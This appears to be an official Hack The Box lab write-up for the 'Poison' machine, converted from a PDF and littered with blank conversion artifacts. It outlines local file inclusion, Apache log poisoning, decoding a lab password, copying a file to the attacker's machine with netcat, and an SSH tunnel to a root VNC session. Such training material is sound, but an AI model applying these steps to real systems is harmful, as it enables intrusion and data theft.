# Poison

*Converted from: Poison.pdf*

---

# Poison
## **8 [th] September 2018 / Document No D18.100.16**

**Prepared By: Alexander Reid (Arrexel)**

**Machine Author: Charix**

**Difficulty: Easy**

**Classification: Official**


Page 1 / 7


## **SYNOPSIS**

Poison is a fairly easy machine which focuses mainly on log poisoning and port

forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for

novice users as many common binaries from other distros are not available.


## **Skills Required**


  - Basic/intermediate knowledge of Linux

  - Understanding of local file inclusions

in PHP


## **Skills Learned**


  - Apache log poisoning

  - Tunneling ports over SSH



Page 2 / 7


## **Enumeration** **Nmap**

Nmap finds OpenSSH and Apache on the target.



Page 3 / 7


​

​


## **Exploitation** **Log Poisoning**

On the Apache server’s homepage there is an input that is vulnerable to local file inclusion.

Checking /etc/passwd shows that the target is running FreeBSD.


By intercepting a request with BurpSuite and modifying the useragent to include a PHP script,

code execution can be achieved.


This will inject the PHP script into the Apache access log at **/var/log/httpd-access.log** ​ which can

then be included using **browse.php** ​


Page 4 / 7



​

​



​

​


Page 5 / 7


​


​

​


​ ​


## **Privilege Escalation** **Charix**

In the web directory there is a **pwdbackup.txt** ​ file which contains a base64-encoded string. It is

recursively encoded 13 times.


Running it through a decoder 13 times reveals the password as **Charix!2#4%6&8(0** ​


​


​ ​



​


​

​


​ ​



​


​


It is possible to use this password for the **charix** ​ user over SSH. Once logged in, there is a


​ ​



​


​

​

**secret.zip** file in the home directory which can be extracted using the same password. The file

​ ​



​


​

​


can be transferred locally with **nc -lp 1234 > secret.zip** ​ on the attacking machine and **nc -w 3** ​



​


​

​


​ ​

**<LAB IP> 1234 < secret.zip** on the target.



​


​

​


​ ​



​


​

​


​ ​


Page 6 / 7


​

​

​


​ ​


## **Root**

​

​

​


​ ​



Running **ps aux** ​ reveals that there is a VNC process belonging to root, however the port is only

​

​


​ ​



​

listening locally. It is possible to tunnel traffic over SSH using the command **ssh** ​

​


​ ​



​

​

**-L5901:127.0.0.1:5901 charix@10.10.10.84** and attempt to connect with VNC using **vncviewer** ​


​ ​



​

​

​

**127.0.0.1::5901**


​ ​



​

​

​


​ ​



​

​

​


By using the **-passwd** ​ flag for vncviewer and supplying the **secret** ​ file, a root shell over VNC is

obtained.


Page 7 / 7



​

​

​


​ ​


